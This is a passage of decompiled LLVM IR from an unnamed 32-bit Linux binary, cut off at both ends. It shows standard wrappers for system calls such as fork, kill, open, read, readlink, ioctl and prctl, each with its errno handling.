  %v0_8052a6a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052a6a = add i32 %v0_8052a6a, 1
  store i32 %v1_8052a6a, i32* %ebx.global-to-local, align 4
  %v0_8052a6b = load i32, i32* %ecx.global-to-local, align 4
  %v10_8052a6b = icmp eq i32 %v0_8052a6b, -1
  %v1_8052a6e = icmp eq i1 %v10_8052a6b, false
  br i1 %v1_8052a6e, label %dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge, label %dec_label_pc_8052a70.loopexit

dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge: ; preds = %dec_label_pc_8052a64
  %v4_8052a64.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a64

dec_label_pc_8052a70.loopexit:                    ; preds = %dec_label_pc_8052a64
  br label %dec_label_pc_8052a70

dec_label_pc_8052a70:                             ; preds = %dec_label_pc_8052a70.loopexit, %dec_label_pc_8052a5b, %dec_label_pc_80529f0
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052a80:                             ; preds = %dec_label_pc_8052a07
  store i8 48, i8* %tmp25, align 1
  %v2_8052a83 = add i32 %arg3, 1
  %v3_8052a83 = inttoptr i32 %v2_8052a83 to i8*
  store i8 0, i8* %v3_8052a83, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052a96:                             ; preds = %dec_label_pc_8052a44
  %v0_8052a96 = load i32, i32* @esp, align 4
  %v2_8052a96 = add i32 %v0_8052a3b, 13
  %v3_8052a96 = add i32 %v2_8052a96, %v0_8052a96
  %v4_8052a96 = inttoptr i32 %v3_8052a96 to i8*
  store i8 45, i8* %v4_8052a96, align 1
  %v1_8052a49.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a49

dec_label_pc_8052a9d:                             ; preds = %dec_label_pc_8052a0b
  %v1_8052a9f = icmp eq i1 %v3_8052a07, false
  br i1 %v1_8052a9f, label %dec_label_pc_8052a19, label %dec_label_pc_8052aa5

dec_label_pc_8052aa5:                             ; preds = %dec_label_pc_8052a9d
  %v1_8052aa7 = sub i32 0, %v4_80529fb
  br label %dec_label_pc_8052a1d

dec_label_pc_8052ab5:                             ; preds = %dec_label_pc_8052a49
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052a49, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052a64

; uselistorder directives
  uselistorder i32 %v1_8052a6a, { 1, 0 }
  uselistorder i32 %v1_8052a69, { 1, 0 }
  uselistorder i32 %v1_8052a54, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052a49, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div20, { 1, 2, 0 }
  uselistorder i32 %v1_8052a3b, { 1, 0 }
  uselistorder i32 %v4_80529fb, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052a64, { 0, 2, 1 }
}

define i32 @function_8052abd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052abd:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8052abd = load i32, i32* @edi, align 4
  %v0_8052abe = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052ad2 = add i32 %arg2, -12
  %v6_8052adc = icmp ugt i32 %v1_8052ad2, 2
  br i1 %v6_8052adc, label %dec_label_pc_8052aec, label %dec_label_pc_8052ade

dec_label_pc_8052ade:                             ; preds = %dec_label_pc_8052abd
  %v4_8052ae2 = call i32 @function_8052b14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8052ad2)
  br label %dec_label_pc_8052b0e

dec_label_pc_8052aec:                             ; preds = %dec_label_pc_8052abd
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052af4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052af4, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8052af4, -4095
  br i1 %tmp17, label %dec_label_pc_8052b0c, label %dec_label_pc_8052b00

dec_label_pc_8052b00:                             ; preds = %dec_label_pc_8052aec
  %v1_8052b00 = call i32 @function_80530b9(i32 %v0_8052abe)
  %v0_8052b05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052b05 = sub i32 0, %v0_8052b05
  %v2_8052b07 = inttoptr i32 %v1_8052b00 to i32*
  store i32 %v1_8052b05, i32* %v2_8052b07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b0c

dec_label_pc_8052b0c:                             ; preds = %dec_label_pc_8052aec, %dec_label_pc_8052b00
  %v0_8052b0c = phi i32 [ %v2_8052af4, %dec_label_pc_8052aec ], [ -1, %dec_label_pc_8052b00 ]
  br label %dec_label_pc_8052b0e

dec_label_pc_8052b0e:                             ; preds = %dec_label_pc_8052ade, %dec_label_pc_8052b0c
  %v0_8052b13 = phi i32 [ %v4_8052ae2, %dec_label_pc_8052ade ], [ %v0_8052b0c, %dec_label_pc_8052b0c ]
  store i32 %v0_8052abe, i32* @ebx, align 4
  store i32 %v0_8052abd, i32* @edi, align 4
  ret i32 %v0_8052b13

; uselistorder directives
  uselistorder i32 %v2_8052af4, { 1, 0, 2 }
  uselistorder i32 %v0_8052abe, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052b0e, { 1, 0 }
  uselistorder label %dec_label_pc_8052b0c, { 1, 0 }
}

define i32 @function_8052b14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b14:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b14 = load i32, i32* @edi, align 4
  store i32 %v0_8052b14, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052b2c = load i32, i32* @ebx, align 4
  %v1_8052b34 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8052b34, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052b34, -4095
  br i1 %tmp12, label %dec_label_pc_8052b4c, label %dec_label_pc_8052b40

dec_label_pc_8052b40:                             ; preds = %dec_label_pc_8052b14
  %v1_8052b40 = call i32 @function_80530b9(i32 %v0_8052b2c)
  %v0_8052b45 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052b45 = sub i32 0, %v0_8052b45
  %v2_8052b47 = inttoptr i32 %v1_8052b40 to i32*
  store i32 %v1_8052b45, i32* %v2_8052b47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052b51.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052b4c

dec_label_pc_8052b4c:                             ; preds = %dec_label_pc_8052b14, %dec_label_pc_8052b40
  %v2_8052b51 = phi i32 [ %v0_8052b14, %dec_label_pc_8052b14 ], [ %v2_8052b51.pre, %dec_label_pc_8052b40 ]
  %v0_8052b4c = phi i32 [ %v1_8052b34, %dec_label_pc_8052b14 ], [ -1, %dec_label_pc_8052b40 ]
  store i32 %v2_8052b51, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052b4c

; uselistorder directives
  uselistorder i32 %v1_8052b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052b4c, { 1, 0 }
}

define i32 @function_8052b53(i8* %arg1) local_unnamed_addr {
dec_label_pc_8052b53:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b53 = load i32, i32* @edi, align 4
  store i32 %v0_8052b53, i32* %stack_var_-4, align 4
  %v4_8052b57 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052b57, i32* %edi.global-to-local, align 4
  %v0_8052b5b = load i32, i32* @ebx, align 4
  %v3_8052b63 = call i32 @chdir(i8* %arg1)
  store i32 %v3_8052b63, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052b63, -4095
  br i1 %tmp9, label %dec_label_pc_8052b7b, label %dec_label_pc_8052b6f

dec_label_pc_8052b6f:                             ; preds = %dec_label_pc_8052b53
  %v1_8052b6f = call i32 @function_80530b9(i32 %v0_8052b5b)
  %v0_8052b74 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052b74 = sub i32 0, %v0_8052b74
  %v2_8052b76 = inttoptr i32 %v1_8052b6f to i32*
  store i32 %v1_8052b74, i32* %v2_8052b76, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052b7f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052b7b

dec_label_pc_8052b7b:                             ; preds = %dec_label_pc_8052b53, %dec_label_pc_8052b6f
  %v2_8052b7f = phi i32 [ %v0_8052b53, %dec_label_pc_8052b53 ], [ %v2_8052b7f.pre, %dec_label_pc_8052b6f ]
  %v0_8052b7b = phi i32 [ %v3_8052b63, %dec_label_pc_8052b53 ], [ -1, %dec_label_pc_8052b6f ]
  store i32 %v2_8052b7f, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052b7b

; uselistorder directives
  uselistorder i32 %v3_8052b63, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052b7b, { 1, 0 }
}

define i32 @function_8052b81(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052b81:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b81 = load i32, i32* @edi, align 4
  store i32 %v0_8052b81, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052b89 = load i32, i32* @ebx, align 4
  %v1_8052b91 = call i32 @close(i32 %arg1)
  store i32 %v0_8052b89, i32* @ebx, align 4
  store i32 %v1_8052b91, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8052b91, -4095
  br i1 %tmp9, label %dec_label_pc_8052ba9, label %dec_label_pc_8052b9d

dec_label_pc_8052b9d:                             ; preds = %dec_label_pc_8052b81
  %v1_8052b9d = call i32 @function_80530b9(i32 %v0_8052b89)
  %v0_8052ba2 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052ba2 = sub i32 0, %v0_8052ba2
  %v2_8052ba4 = inttoptr i32 %v1_8052b9d to i32*
  store i32 %v1_8052ba2, i32* %v2_8052ba4, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052bad.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052ba9

dec_label_pc_8052ba9:                             ; preds = %dec_label_pc_8052b81, %dec_label_pc_8052b9d
  %v2_8052bad = phi i32 [ %v0_8052b81, %dec_label_pc_8052b81 ], [ %v2_8052bad.pre, %dec_label_pc_8052b9d ]
  %v0_8052ba9 = phi i32 [ %v1_8052b91, %dec_label_pc_8052b81 ], [ -1, %dec_label_pc_8052b9d ]
  %v2_8052bab = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052bab, i32* @edx, align 4
  store i32 %v2_8052bad, i32* @edi, align 4
  ret i32 %v0_8052ba9

; uselistorder directives
  uselistorder i32 %v1_8052b91, { 1, 0, 2 }
  uselistorder i32 %v0_8052b89, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052ba9, { 1, 0 }
}

define i32 @function_8052baf() local_unnamed_addr {
dec_label_pc_8052baf:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052baf = load i32, i32* @ebx, align 4
  store i32 %v0_8052baf, i32* %stack_var_-4, align 4
  %v1_8052bb8 = call i32 @fork(i32 %v0_8052baf)
  store i32 %v1_8052bb8, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052bb8, -4095
  br i1 %tmp7, label %dec_label_pc_8052bcf, label %dec_label_pc_8052bc3

dec_label_pc_8052bc3:                             ; preds = %dec_label_pc_8052baf
  %v1_8052bc3 = call i32 @function_80530b9(i32 %v0_8052baf)
  %v0_8052bc8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052bc8 = sub i32 0, %v0_8052bc8
  %v2_8052bca = inttoptr i32 %v1_8052bc3 to i32*
  store i32 %v1_8052bc8, i32* %v2_8052bca, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052bd3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052bcf

dec_label_pc_8052bcf:                             ; preds = %dec_label_pc_8052baf, %dec_label_pc_8052bc3
  %v2_8052bd3 = phi i32 [ %v0_8052baf, %dec_label_pc_8052baf ], [ %v2_8052bd3.pre, %dec_label_pc_8052bc3 ]
  %v0_8052bcf = phi i32 [ %v1_8052bb8, %dec_label_pc_8052baf ], [ -1, %dec_label_pc_8052bc3 ]
  store i32 %v2_8052bd3, i32* @ebx, align 4
  ret i32 %v0_8052bcf

; uselistorder directives
  uselistorder i32 %v1_8052bb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052bcf, { 1, 0 }
}

define i32 @function_8052bd5() local_unnamed_addr {
dec_label_pc_8052bd5:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052bd5 = load i32, i32* @ebx, align 4
  store i32 %v0_8052bd5, i32* %stack_var_-4, align 4
  %v1_8052bde = call i32 @getpid(i32 %v0_8052bd5)
  store i32 %v1_8052bde, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052bde, -4095
  br i1 %tmp7, label %dec_label_pc_8052bf5, label %dec_label_pc_8052be9

dec_label_pc_8052be9:                             ; preds = %dec_label_pc_8052bd5
  %v1_8052be9 = call i32 @function_80530b9(i32 %v0_8052bd5)
  %v0_8052bee = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052bee = sub i32 0, %v0_8052bee
  %v2_8052bf0 = inttoptr i32 %v1_8052be9 to i32*
  store i32 %v1_8052bee, i32* %v2_8052bf0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052bf9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052bf5

dec_label_pc_8052bf5:                             ; preds = %dec_label_pc_8052bd5, %dec_label_pc_8052be9
  %v2_8052bf9 = phi i32 [ %v0_8052bd5, %dec_label_pc_8052bd5 ], [ %v2_8052bf9.pre, %dec_label_pc_8052be9 ]
  %v0_8052bf5 = phi i32 [ %v1_8052bde, %dec_label_pc_8052bd5 ], [ -1, %dec_label_pc_8052be9 ]
  %v2_8052bf7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052bf7, i32* @edx, align 4
  store i32 %v2_8052bf9, i32* @ebx, align 4
  ret i32 %v0_8052bf5

; uselistorder directives
  uselistorder i32 %v1_8052bde, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052bf5, { 1, 0 }
}

define i32 @function_8052bfb() local_unnamed_addr {
dec_label_pc_8052bfb:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052bfb = load i32, i32* @ebx, align 4
  store i32 %v0_8052bfb, i32* %stack_var_-4, align 4
  %v1_8052c04 = call i32 @getppid(i32 %v0_8052bfb)
  store i32 %v1_8052c04, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052c04, -4095
  br i1 %tmp7, label %dec_label_pc_8052c1b, label %dec_label_pc_8052c0f

dec_label_pc_8052c0f:                             ; preds = %dec_label_pc_8052bfb
  %v1_8052c0f = call i32 @function_80530b9(i32 %v0_8052bfb)
  %v0_8052c14 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c14 = sub i32 0, %v0_8052c14
  %v2_8052c16 = inttoptr i32 %v1_8052c0f to i32*
  store i32 %v1_8052c14, i32* %v2_8052c16, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052c1f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c1b

dec_label_pc_8052c1b:                             ; preds = %dec_label_pc_8052bfb, %dec_label_pc_8052c0f
  %v2_8052c1f = phi i32 [ %v0_8052bfb, %dec_label_pc_8052bfb ], [ %v2_8052c1f.pre, %dec_label_pc_8052c0f ]
  %v0_8052c1b = phi i32 [ %v1_8052c04, %dec_label_pc_8052bfb ], [ -1, %dec_label_pc_8052c0f ]
  %v2_8052c1d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052c1d, i32* @edx, align 4
  store i32 %v2_8052c1f, i32* @ebx, align 4
  ret i32 %v0_8052c1b

; uselistorder directives
  uselistorder i32 %v1_8052c04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c1b, { 1, 0 }
}

define i32 @function_8052c21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052c21:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c21 = load i32, i32* @edi, align 4
  store i32 %v0_8052c21, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052c39 = load i32, i32* @ebx, align 4
  %v2_8052c41 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052c41, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8052c41, -4095
  br i1 %tmp12, label %dec_label_pc_8052c59, label %dec_label_pc_8052c4d

dec_label_pc_8052c4d:                             ; preds = %dec_label_pc_8052c21
  %v1_8052c4d = call i32 @function_80530b9(i32 %v0_8052c39)
  %v0_8052c52 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052c52 = sub i32 0, %v0_8052c52
  %v2_8052c54 = inttoptr i32 %v1_8052c4d to i32*
  store i32 %v1_8052c52, i32* %v2_8052c54, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052c5e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c59

dec_label_pc_8052c59:                             ; preds = %dec_label_pc_8052c21, %dec_label_pc_8052c4d
  %v2_8052c5e = phi i32 [ %v0_8052c21, %dec_label_pc_8052c21 ], [ %v2_8052c5e.pre, %dec_label_pc_8052c4d ]
  %v0_8052c59 = phi i32 [ %v2_8052c41, %dec_label_pc_8052c21 ], [ -1, %dec_label_pc_8052c4d ]
  store i32 %v2_8052c5e, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052c59

; uselistorder directives
  uselistorder i32 %v2_8052c41, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c59, { 1, 0 }
}

define i32 @function_8052c60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052c60:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c60 = load i32, i32* @ebx, align 4
  store i32 %v0_8052c60, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052c73 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8052c73, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8052c73, -4095
  br i1 %tmp9, label %dec_label_pc_8052c8c, label %dec_label_pc_8052c80

dec_label_pc_8052c80:                             ; preds = %dec_label_pc_8052c60
  %v1_8052c80 = call i32 @function_80530b9(i32 %v0_8052c60)
  %v0_8052c85 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c85 = sub i32 0, %v0_8052c85
  %v2_8052c87 = inttoptr i32 %v1_8052c80 to i32*
  store i32 %v1_8052c85, i32* %v2_8052c87, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052c90.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c8c

dec_label_pc_8052c8c:                             ; preds = %dec_label_pc_8052c60, %dec_label_pc_8052c80
  %v2_8052c90 = phi i32 [ %v0_8052c60, %dec_label_pc_8052c60 ], [ %v2_8052c90.pre, %dec_label_pc_8052c80 ]
  %v0_8052c8c = phi i32 [ %v2_8052c73, %dec_label_pc_8052c60 ], [ -1, %dec_label_pc_8052c80 ]
  %v2_8052c8e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052c8e, i32* @edx, align 4
  store i32 %v2_8052c90, i32* @ebx, align 4
  ret i32 %v0_8052c8c

; uselistorder directives
  uselistorder i32 %v2_8052c73, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052c8c, { 1, 0 }
}

define i32 @function_8052c92(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052c92:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8052c93 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8052c99 = sdiv i32 %sext, 16777216
  store i32 %v4_8052c99, i32* @ecx, align 4
  %v4_8052c9d = ptrtoint i8* %arg1 to i32
  %v3_8052ca1 = and i32 %arg2, 64
  %v4_8052ca1 = icmp eq i32 %v3_8052ca1, 0
  br i1 %v4_8052ca1, label %dec_label_pc_8052cb2, label %dec_label_pc_8052ca6

dec_label_pc_8052ca6:                             ; preds = %dec_label_pc_8052c92
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052cb2

dec_label_pc_8052cb2:                             ; preds = %dec_label_pc_8052c92, %dec_label_pc_8052ca6
  %v0_8052cb2 = phi i32 [ 0, %dec_label_pc_8052c92 ], [ %phitmp, %dec_label_pc_8052ca6 ]
  store i32 %v0_8052cb2, i32* @edx, align 4
  store i32 %v4_8052c9d, i32* %ebx.global-to-local, align 4
  %v5_8052cbd = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8052c99)
  store i32 %v5_8052cbd, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_8052cbd, -4095
  br i1 %tmp16, label %dec_label_pc_8052cd5, label %dec_label_pc_8052cc9

dec_label_pc_8052cc9:                             ; preds = %dec_label_pc_8052cb2
  %v1_8052cc9 = call i32 @function_80530b9(i32 %v0_8052c93)
  %v0_8052cce = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052cce = sub i32 0, %v0_8052cce
  %v2_8052cd0 = inttoptr i32 %v1_8052cc9 to i32*
  store i32 %v1_8052cce, i32* %v2_8052cd0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052cd5

dec_label_pc_8052cd5:                             ; preds = %dec_label_pc_8052cb2, %dec_label_pc_8052cc9
  %v0_8052cd5 = phi i32 [ %v5_8052cbd, %dec_label_pc_8052cb2 ], [ -1, %dec_label_pc_8052cc9 ]
  store i32 %v0_8052c93, i32* @ebx, align 4
  ret i32 %v0_8052cd5

; uselistorder directives
  uselistorder i32 %v5_8052cbd, { 1, 0, 2 }
  uselistorder i32 %v4_8052c99, { 1, 0 }
  uselistorder i32 %v0_8052c93, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052cd5, { 1, 0 }
  uselistorder label %dec_label_pc_8052cb2, { 1, 0 }
}

define i32 @function_8052cdd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8052cdd:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052cde = load i32, i32* @esi, align 4
  store i32 %v0_8052cde, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052cf6 = load i32, i32* @ebx, align 4
  %v5_8052cfe = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_8052cfe, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_8052cfe, -4095
  br i1 %tmp12, label %dec_label_pc_8052d16, label %dec_label_pc_8052d0a

dec_label_pc_8052d0a:                             ; preds = %dec_label_pc_8052cdd
  %v1_8052d0a = call i32 @function_80530b9(i32 %v0_8052cf6)
  %v0_8052d0f = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d0f = sub i32 0, %v0_8052d0f
  %v2_8052d11 = inttoptr i32 %v1_8052d0a to i32*
  store i32 %v1_8052d0f, i32* %v2_8052d11, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052d19.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052d16

dec_label_pc_8052d16:                             ; preds = %dec_label_pc_8052cdd, %dec_label_pc_8052d0a
  %v2_8052d19 = phi i32 [ %v0_8052cde, %dec_label_pc_8052cdd ], [ %v2_8052d19.pre, %dec_label_pc_8052d0a ]
  %v0_8052d16 = phi i32 [ %v5_8052cfe, %dec_label_pc_8052cdd ], [ -1, %dec_label_pc_8052d0a ]
  store i32 %v2_8052d19, i32* %esi.global-to-local, align 4
  ret i32 %v0_8052d16

; uselistorder directives
  uselistorder i32 %v5_8052cfe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052d16, { 1, 0 }
}

define i32 @function_8052d1c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052d1c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d1c = load i32, i32* @edi, align 4
  store i32 %v0_8052d1c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052d2c = load i32, i32* @ebx, align 4
  %v4_8052d34 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8052d2c, i32* @ebx, align 4
  store i32 %v4_8052d34, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052d34, -4095
  br i1 %tmp12, label %dec_label_pc_8052d4c, label %dec_label_pc_8052d40

dec_label_pc_8052d40:                             ; preds = %dec_label_pc_8052d1c
  %v1_8052d40 = call i32 @function_80530b9(i32 %v0_8052d2c)
  %v0_8052d45 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052d45 = sub i32 0, %v0_8052d45
  %v2_8052d47 = inttoptr i32 %v1_8052d40 to i32*
  store i32 %v1_8052d45, i32* %v2_8052d47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052d50.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052d4c

dec_label_pc_8052d4c:                             ; preds = %dec_label_pc_8052d1c, %dec_label_pc_8052d40
  %v2_8052d50 = phi i32 [ %v0_8052d1c, %dec_label_pc_8052d1c ], [ %v2_8052d50.pre, %dec_label_pc_8052d40 ]
  %v0_8052d4c = phi i32 [ %v4_8052d34, %dec_label_pc_8052d1c ], [ -1, %dec_label_pc_8052d40 ]
  store i32 %v2_8052d50, i32* @edi, align 4
  ret i32 %v0_8052d4c

; uselistorder directives
  uselistorder i32 %v4_8052d34, { 1, 0, 2 }
  uselistorder i32 %v0_8052d2c, { 1, 0 }
  uselistorder label %dec_label_pc_8052d4c, { 1, 0 }
}

define i32 @function_8052d52(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052d52:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d52 = load i32, i32* @edi, align 4
  store i32 %v0_8052d52, i32* %stack_var_-4, align 4
  %v4_8052d56 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d56, i32* %edi.global-to-local, align 4
  %v0_8052d62 = load i32, i32* @ebx, align 4
  %v7_8052d6a = call i32 @readlink(i8* %arg1, i8* %tmp6, i32 %arg3)
  store i32 %v0_8052d62, i32* @ebx, align 4
  store i32 %v7_8052d6a, i32* %edi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8052d6a, -4095
  br i1 %tmp14, label %dec_label_pc_8052d82, label %dec_label_pc_8052d76

dec_label_pc_8052d76:                             ; preds = %dec_label_pc_8052d52
  %v1_8052d76 = call i32 @function_80530b9(i32 %v0_8052d62)
  %v0_8052d7b = load i32, i32* %edi.global-to-local, align 4
  %v1_8052d7b = sub i32 0, %v0_8052d7b
  %v2_8052d7d = inttoptr i32 %v1_8052d76 to i32*
  store i32 %v1_8052d7b, i32* %v2_8052d7d, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052d86.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052d82

dec_label_pc_8052d82:                             ; preds = %dec_label_pc_8052d52, %dec_label_pc_8052d76
  %v2_8052d86 = phi i32 [ %v0_8052d52, %dec_label_pc_8052d52 ], [ %v2_8052d86.pre, %dec_label_pc_8052d76 ]
  %v0_8052d82 = phi i32 [ %v7_8052d6a, %dec_label_pc_8052d52 ], [ -1, %dec_label_pc_8052d76 ]
  %v2_8052d84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d84, i32* @edx, align 4
  store i32 %v2_8052d86, i32* @edi, align 4
  ret i32 %v0_8052d82

